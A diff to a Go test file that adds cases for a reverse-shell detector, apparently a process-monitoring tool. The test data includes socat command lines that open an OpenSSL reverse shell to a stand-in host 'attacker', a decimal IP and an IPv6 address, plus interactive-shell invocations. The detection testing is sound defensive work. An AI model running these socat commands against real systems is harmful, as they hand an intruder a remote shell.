@@ -106,6 +106,39 @@ func TestDetectReverseShells(t *testing.T) {
 			},
 			wantCount: 1,
 		},
+		// socat SYSTEM: is EXEC:'s twin; with a dotless host, decimal or IPv6
+		// address there is no network indicator, so it must be self-sufficient
+		// on a socat command line.
+		{
+			name:      "socat SYSTEM: with dotless hostname",
+			processes: []Process{{PID: 1234, User: "1000", Command: `socat OPENSSL:attacker:443 SYSTEM:sh`}},
+			wantCount: 1,
+		},
+		{
+			name:      "socat SYSTEM: with decimal IP",
+			processes: []Process{{PID: 1234, User: "1000", Command: `socat OPENSSL:3232235777:443 SYSTEM:/bin/sh`}},
+			wantCount: 1,
+		},
+		{
+			name:      "socat SYSTEM: with IPv6 address",
+			processes: []Process{{PID: 1234, User: "1000", Command: `/usr/bin/socat OPENSSL:[2001:db8::1]:443 SYSTEM:sh`}},
+			wantCount: 1,
+		},
+		{
+			name:      "system: without socat is not a reverse shell",
+			processes: []Process{{PID: 1234, User: "1000", Command: `kubectl get pods -n kube-system: --watch`}},
+			wantCount: 0,
+		},
+		// Token anchoring stopped "sh -i" from matching inside these shell
+		// names, so each must be listed explicitly.
+		{name: "csh -i", processes: []Process{{PID: 1, User: "1000", Command: `csh -i`}}, wantCount: 1},
+		{name: "tcsh -i", processes: []Process{{PID: 1, User: "1000", Command: `tcsh -i >& /dev/null`}}, wantCount: 1},
+		{name: "mksh -i", processes: []Process{{PID: 1, User: "1000", Command: `/bin/mksh -i`}}, wantCount: 1},
+		{name: "oksh -i", processes: []Process{{PID: 1, User: "1000", Command: `oksh -i`}}, wantCount: 1},
+		{name: "lksh -i", processes: []Process{{PID: 1, User: "1000", Command: `lksh -i`}}, wantCount: 1},
+		{name: "posh -i", processes: []Process{{PID: 1, User: "1000", Command: `posh -i`}}, wantCount: 1},
+		{name: "yash -i", processes: []Process{{PID: 1, User: "1000", Command: `yash -i`}}, wantCount: 1},
+		{name: "rbash -i", processes: []Process{{PID: 1, User: "1000", Command: `rbash -i`}}, wantCount: 1},
 		{
 			name: "nc -e with hostname (no dotted IP) stays detected",
 			processes: []Process{
